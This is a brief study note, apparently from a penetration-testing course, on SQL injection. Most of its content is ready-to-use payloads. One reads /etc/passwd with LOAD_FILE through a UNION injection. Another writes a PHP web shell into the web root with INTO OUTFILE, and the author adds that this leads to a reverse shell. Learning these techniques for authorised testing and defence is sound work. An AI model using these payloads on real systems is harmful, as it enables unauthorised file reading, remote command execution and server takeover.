# SQL Injection Fundamentals

This was all pretty simpe. The new stuff is as follows.

## Reading Files

```sql
SELECT LOAD_FILE('/etc/passwd');
```

```sql
UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

## Writing Files

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

This can be used to get a reverse shell
